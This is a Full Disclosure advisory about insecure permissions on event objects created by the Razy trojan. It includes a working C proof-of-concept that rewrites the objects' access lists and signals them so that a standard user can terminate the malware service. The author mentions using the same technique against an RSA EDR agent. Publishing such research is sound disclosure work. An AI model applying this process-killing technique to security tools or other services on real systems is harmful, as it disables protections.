
Date: Sun, 7 Apr 2024 23:52:09 -0400
From: malvuln <malvuln13@...il.com>
To: fulldisclosure@...lists.org
Subject: [FD] Trojan.Win32.Razy.abc / Insecure Permissions (In memory IPC)

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/0eb4a9089d3f7cf431d6547db3b9484d.txt
Contact: malvuln13@...il.com
Media: twitter.com/malvuln

Threat: Trojan.Win32.Razy.abc
Vulnerability: Insecure Permissions (In memory IPC)
Family: Razy
Type: PE32
MD5: 0eb4a9089d3f7cf431d6547db3b9484d
SHA256: 3d82fee314e7febb8307ccf8a7396b6dd53c7d979a74aa56f3c4a6d0702fd098
Vuln ID: MVID-2024-0678
Dropped files: performer.exe
Disclosure: 04/07/2024
Description:  The trojan installs a service under "C:\Program Files
(x86)\SmartData" and runs with SYSTEM integrity. Terminating the malware
service would typically require high integrity user privileges. However,
standard low integrity users can successfully terminate it by exploiting
insecure Win32 in memory event objects "esnm" or "epp". Since no
permissions are set on these IPC objects a low integrity user can set the
DACL to deny access for the everyone user group, then set and reset the
event to cause the malware to terminate. Interestingly, I used same
technique to defeat RSA's EDR agent "netwitness" CVE-2022-47529.

PE file "performer.exe" is ran using rundll32 RunHTMLApplication.

Win32 API Event objects.
performer.exe creates Event  \BaseNamedObjects\epp  ===> with no
permissions set
svchost_ms.exe creates Event \BaseNamedObjects\esnm   ===> with no
permissions set

Exploit/PoC:
"Trojan_Razy_Exploit.c"

#include "windows.h"
#include "stdio.h"
#include "accctrl.h"
#include "aclapi.h"
#define OPEN_ALL_ACCESS 0x1F0003

/*
John Page (aka hyp3rlinx) - circa April of 2024 Malvuln project
Incorrect in-memory Win32 API access control allows termination of the
malware service by a standard user.
Trojan.Win32.Razy.abc
MD5: 0eb4a9089d3f7cf431d6547db3b9484d
*/

char Vuln_Events[][32] = {"Global\\esnm", "Global\\epp"};
BOOL PWNED=FALSE;

int main(void){

PACL pOldDACL = NULL;
PACL pNewDACL = NULL;
int i=0;

for(; i < sizeof(Vuln_Events) /  sizeof(Vuln_Events[0]); i++){
 HANDLE hEvent = OpenEventA(OPEN_ALL_ACCESS,FALSE,(LPCSTR)Vuln_Events[i]);

if (hEvent != INVALID_HANDLE_VALUE){
   if(!PWNED){
       printf("[+] Exploiting Trojan Razy Event: %s\n", Vuln_Events[i]);
   }

  if(GetSecurityInfo(hEvent, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
NULL, NULL, &pOldDACL, NULL, NULL) == ERROR_SUCCESS){
    TRUSTEE trustee[1];
    trustee[0].TrusteeForm = TRUSTEE_IS_NAME;
    trustee[0].TrusteeType = TRUSTEE_IS_GROUP;
    trustee[0].ptstrName = TEXT("Everyone");
    trustee[0].MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
    trustee[0].pMultipleTrustee = NULL;

    EXPLICIT_ACCESS explicit_access_list[1];
    ZeroMemory(&explicit_access_list[0], sizeof(EXPLICIT_ACCESS));

    explicit_access_list[0].grfAccessMode = DENY_ACCESS;
    explicit_access_list[0].grfAccessPermissions = GENERIC_ALL;
    explicit_access_list[0].grfInheritance = NO_INHERITANCE;
    explicit_access_list[0].Trustee = trustee[0];

    if(SetEntriesInAcl(1, explicit_access_list, pOldDACL, &pNewDACL) !=
ERROR_SUCCESS){
       printf("%d", GetLastError());
    }

    if(SetSecurityInfo(hEvent, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
NULL, NULL, pNewDACL, NULL) != ERROR_SUCCESS){
       printf("%d", GetLastError());
      }else{
        PWNED=TRUE;
        SetEvent(hEvent);
        Sleep(1000);
        ResetEvent(hEvent);
        CloseHandle(hEvent);
        Sleep(1000);
      }
    LocalFree(pNewDACL);
    LocalFree(pOldDACL);
    CloseHandle(hEvent);
    Sleep(1000);
   }
 }
}
if(PWNED){
  printf("[+] Trojan.Win32.Razy.abc / MD5: 0eb4a9089d3f7cf431d6547db3b9484d
PWNED!\n");
  PWNED=FALSE;
}
printf("[+] By malvuln... Done!\n");
system("pause");
return 666;
}


Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
